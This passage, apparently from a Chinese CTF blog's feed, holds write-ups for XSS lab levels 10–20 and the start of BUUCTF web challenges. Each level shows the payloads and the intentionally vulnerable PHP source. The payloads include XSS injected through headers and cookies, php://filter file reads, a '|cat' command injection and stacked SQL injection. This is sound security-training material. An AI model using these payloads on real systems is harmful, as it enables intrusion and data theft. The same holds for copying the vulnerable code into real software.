class="variable">$str7</span>,<span class="string">&#x27;http://&#x27;</span>))  <span class="comment">//需要含有http://</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.<span class="variable">$str7</span>.<span class="string">&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Level10"><a href="#Level10" class="headerlink" title="Level10"></a>Level10</h2><h3 id="Payload-9"><a href="#Payload-9" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/level10.php?keyword=&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&amp;t_sort=&quot; type=&quot;text&quot; onclick=&quot;alert(&#x27;xss&#x27;)</span><br><span class="line">/level10.php?keyword=1&amp;t_sort=1&quot;onclick=&quot;alert(1)&quot;type=&quot;&quot;</span><br></pre></td></tr></table></figure><h3 id="源码分析-9"><a href="#源码分析-9" class="headerlink" title="源码分析"></a>源码分析</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str22</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Level11"><a href="#Level11" class="headerlink" title="Level11"></a>Level11</h2><h3 id="Payload-10"><a href="#Payload-10" class="headerlink" title="Payload"></a>Payload</h3><p><code>header</code>里面添加<code>Referer</code>字段即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">referer:&quot;type=&quot;text&quot; onclick=&quot;alert(&#x27;xss&#x27;)</span><br><span class="line">Referer:1&quot;onclick=&quot;alert(1)&quot;type=&quot;&quot;</span><br></pre></td></tr></table></figure><h3 id="源码分析-10"><a href="#源码分析-10" class="headerlink" title="源码分析"></a>源码分析</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str00</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];</span><br><span class="line"><span class="variable">$str22</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str00</span>).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_ref&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Level12"><a href="#Level12" class="headerlink" title="Level12"></a>Level12</h2><h3 id="Payload-11"><a href="#Payload-11" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-Agent: &quot;type=&quot;text&quot; onclick=&quot;alert(1)</span><br></pre></td></tr></table></figure><h3 id="源码分析-11"><a href="#源码分析-11" class="headerlink" title="源码分析"></a>源码分析</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str00</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line"><span class="variable">$str22</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str00</span>).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_ua&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Level13"><a href="#Level13" class="headerlink" title="Level13"></a>Level13</h2><h3 id="Payload-12"><a href="#Payload-12" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cookie: user=&quot;type=&quot;text&quot; onclick=&quot;alert(1)</span><br></pre></td></tr></table></figure><h3 id="源码分析-12"><a href="#源码分析-12" class="headerlink" title="源码分析"></a>源码分析</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;user&quot;</span>, <span class="string">&quot;call me maybe?&quot;</span>, <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str00</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span>=<span class="variable">$_COOKIE</span>[<span class="string">&quot;user&quot;</span>];</span><br><span class="line"><span class="variable">$str22</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str00</span>).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_cook&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Level14"><a href="#Level14" class="headerlink" title="Level14"></a>Level14</h2><blockquote><p>本关因<strong>iframe</strong>调用的文件地址失效，无法进行测试。</p><p>要考的应该是通过修改<code>iframe调用</code>的文件来实现xss注入</p></blockquote><h2 id="Level15"><a href="#Level15" class="headerlink" title="Level15"></a>Level15</h2><h3 id="Payload-13"><a href="#Payload-13" class="headerlink" title="Payload"></a>Payload</h3><p><code>src</code>地址更换成<code>https://cdn.staticfile.org/angular.js/1.4.6/angular.min.js</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/level15.php?src=&#x27;level1.php?name=&lt;img src=1 onerror=alert(1)&gt;&#x27;</span><br></pre></td></tr></table></figure><h3 id="源码分析-13"><a href="#源码分析-13" class="headerlink" title="源码分析"></a>源码分析</h3><blockquote><p><a href="https://blog.csdn.net/wo41ge/article/details/107459332?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-107459332-blog-122234512.topnsimilarv1&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-107459332-blog-122234512.topnsimilarv1&utm_relevant_index=1">原文地址</a></p><p><code>ng-include</code>是<code>angular js</code>中的东西，其作用相当于<code>php</code>的<code>include</code>函数</p><p>1、ng-include 指令用于包含外部的 HTML文件。</p><p>2、包含的内容将作为指定元素的子节点。</p><p>3、ng-include 属性的值可以是一个表达式，返回一个文件名。</p><p>4、默认情况下，包含的文件需要包含在同一个域名下。</p><p>特别值得注意的几点如下：</p><p>1.ng-include,如果单纯指定地址，必须要加引号</p><p>2.ng-include,加载外部html，script标签中的内容不执行</p><p>3.ng-include,加载外部html中含有style标签样式可以识别</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;src&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;body&gt;&lt;span class=&quot;ng-include:&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&#x27;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Level16"><a href="#Level16" class="headerlink" title="Level16"></a>Level16</h2><h3 id="Payload-14"><a href="#Payload-14" class="headerlink" title="Payload"></a>Payload</h3><p><code>%0A</code>表示换行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img%0Asrc=&quot;111&quot;%0Aonerror=alert(&#x27;xss&#x27;)%0A&gt;</span><br></pre></td></tr></table></figure><h3 id="源码分析-14"><a href="#源码分析-14" class="headerlink" title="源码分析"></a>源码分析</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str4</span>); <span class="comment">//用回车来将它们分开</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&quot;</span>.<span class="variable">$str5</span>.<span class="string">&quot;&lt;/center&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Level17"><a href="#Level17" class="headerlink" title="Level17"></a>Level17</h2><h3 id="Payload-15"><a href="#Payload-15" class="headerlink" title="Payload"></a>Payload</h3><p>可以试试谷歌浏览器</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/level17.php?arg01=a&amp;arg02=123%20onmousedown=%27alert(1)%27</span><br></pre></td></tr></table></figure><h3 id="源码分析-15"><a href="#源码分析-15" class="headerlink" title="源码分析"></a>源码分析</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;embed src=xsf01.swf?&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_GET</span>[<span class="string">&quot;arg01&quot;</span>]).<span class="string">&quot;=&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_GET</span>[<span class="string">&quot;arg02&quot;</span>]).<span class="string">&quot; width=100% heigth=100%&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Level18"><a href="#Level18" class="headerlink" title="Level18"></a>Level18</h2><h3 id="Payload-16"><a href="#Payload-16" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/level18.php?arg01=a&amp;arg02=123%20onmousedown=%27alert(1)%27</span><br></pre></td></tr></table></figure><h3 id="源码分析-16"><a href="#源码分析-16" class="headerlink" title="源码分析"></a>源码分析</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;embed src=xsf02.swf?&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_GET</span>[<span class="string">&quot;arg01&quot;</span>]).<span class="string">&quot;=&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_GET</span>[<span class="string">&quot;arg02&quot;</span>]).<span class="string">&quot; width=100% heigth=100%&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Level19"><a href="#Level19" class="headerlink" title="Level19"></a>Level19</h2><p>略</p><h2 id="Level20"><a href="#Level20" class="headerlink" title="Level20"></a>Level20</h2><p>略</p>]]></content>
      
      
      <categories>
          
          <category> CTF_Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf Web 刷题记录 1</title>
      <link href="/2022/06/23/buuctf-web1/"/>
      <url>/2022/06/23/buuctf-web1/</url>
      
        <content type="html"><![CDATA[<h1 id="buuctf-Web-刷题记录-1"><a href="#buuctf-Web-刷题记录-1" class="headerlink" title="buuctf Web 刷题记录 1"></a>buuctf Web 刷题记录 1</h1><blockquote><p>参考：</p><p><a href="https://www.ghtwf01.cn/index.php/archives/303/">命令执行漏洞利用及绕过方式总结</a></p><p><a href="https://blog.csdn.net/weixin_45766049/article/details/117487209">SSTI模版注入</a></p><p><a href="https://cizixs.com/2017/03/08/flask-insight-session/">flask 源码解析：session</a></p><p><a href="https://www.leavesongs.com/PENETRATION/client-session-security.html">客户端 session 导致的安全问题</a></p><p><a href="https://blog.csdn.net/iczfy585/article/details/106081299">PHP中MD5常见绕过</a></p></blockquote><h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><p>点击<code>hint</code>后发现地址栏处有<code>file=flag.php</code>，故构造payload</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://ae8bac3b-f39b-4695-b09d-2906050c1289.node4.buuoj.cn:81/?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p>得到flag.php的base64编码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7ZTIyMWQyMzQtYThjNi00NzMyLTg2YzQtZWQzMTMxMzJlZGM0fQo=</span><br></pre></td></tr></table></figure><p>解码即可得到flag</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Can you find out the flag?&quot;</span>;</span><br><span class="line"><span class="comment">//flag&#123;e221d234-a8c6-4732-86c4-ed313132edc4&#125;</span></span><br></pre></td></tr></table></figure><h2 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h2><p>尝试命令<code>127.0.0.1|ls</code>发现可以执行，于是构造payload为<code>127.0.0.1|cat ../../../flag</code>即可</p><h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><h3 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h3><p>堆叠注入获取信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1;show databases; #爆出数据库</span><br><span class="line">1;show tables;  #爆出表名</span><br><span class="line">1;show columns from Flag#发现被过滤用不了</span><br></pre></td></tr></table></figure><p>因为回显是<code>var_dump</code>样式，当查询语句为纯数字的时候才回显，使用<code>1,2,3,4,5</code>进行测试发现原本查询唯独末尾的5变为了1，猜测是用到了管道符（| ||之类的），导致5回显失败。故使用<code>1</code>使得<code>|</code>或者是<code>||</code>失效即可。</p><p><img src="https://img.gejiba.com/images/e8e16f43c6ceb4f04afd49158db5317a.png" alt="e8e16f43c6ceb4f04afd49158db5317a.png"></p><h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h3><p>传入<code>99;set sql_mode=PIPES_AS_CONCAT;select 0</code>使得<code>||</code>作为字符操作符而不是执行或运算。</p><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$post</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="variable">$get</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$MysqlLink</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//GetPara();</span></span><br><span class="line">    <span class="variable">$MysqlLink</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;localhost&quot;</span>,<span class="variable">$datauser</span>,<span class="variable">$datapass</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$MysqlLink</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Mysql Connect Error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$selectDB</span> = <span class="title function_ invoke__">mysqli_select_db</span>(<span class="variable">$MysqlLink</span>,<span class="variable">$dataName</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$selectDB</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Choose Database Error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$k</span>=&gt;<span class="variable">$v</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$v</span>)&amp;&amp;<span class="title function_ invoke__">is_string</span>(<span class="variable">$v</span>))&#123;</span><br><span class="line">            <span class="variable">$post</span>[<span class="variable">$k</span>] = <span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">addslashes</span>(<span class="variable">$v</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$k</span>=&gt;<span class="variable">$v</span>)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//die();</span></span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;a&gt; Give me your flag, I will tell you <span class="keyword">if</span> the flag is right. &lt;/ a&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;query&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$post</span>[<span class="string">&#x27;query&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$BlackList</span> = <span class="string">&quot;prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile</span></span><br><span class="line"><span class="string">        |readfile|where|from|union|update|delete|if|sleep|extractvalue|</span></span><br><span class="line"><span class="string">        updatexml|or|and|&amp;|\&quot;&quot;</span>;</span><br><span class="line">        <span class="comment">//var_dump(preg_match(&quot;/&#123;$BlackList&#125;/is&quot;,$post[&#x27;query&#x27;]));</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/<span class="subst">&#123;$BlackList&#125;</span>/is&quot;</span>,<span class="variable">$post</span>[<span class="string">&#x27;query&#x27;</span>]))&#123;</span><br><span class="line">            <span class="comment">//echo $post[&#x27;query&#x27;];</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Nonono.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$post</span>[<span class="string">&#x27;query&#x27;</span>])&gt;<span class="number">40</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Too long.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select &quot;</span>.<span class="variable">$post</span>[<span class="string">&#x27;query&#x27;</span>].<span class="string">&quot;||flag from Flag&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">mysqli_multi_query</span>(<span class="variable">$MysqlLink</span>,<span class="variable">$sql</span>);</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span> = <span class="title function_ invoke__">mysqli_store_result</span>(<span class="variable">$MysqlLink</span>))&#123;</span><br><span class="line">                <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_row</span>(<span class="variable">$res</span>))&#123;</span><br><span class="line">                    <span class="title function_ invoke__">print_r</span>(<span class="variable">$row</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">while</span>(@<span class="title function_ invoke__">mysqli_next_result</span>(<span class="variable">$MysqlLink</span>));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h2><p>查看源码发现<code>Archive_room.php</code>，紧接着点击进入<code>action.php</code>，发现会自动跳转到<code>end.php</code>，故使用burp抓包可以得到<code>  secr3t.php</code>，访问后得到源码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;secret&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    $file=$_GET[&#x27;file&#x27;];</span><br><span class="line">    if(strstr($file,&quot;../&quot;)||stristr($file, 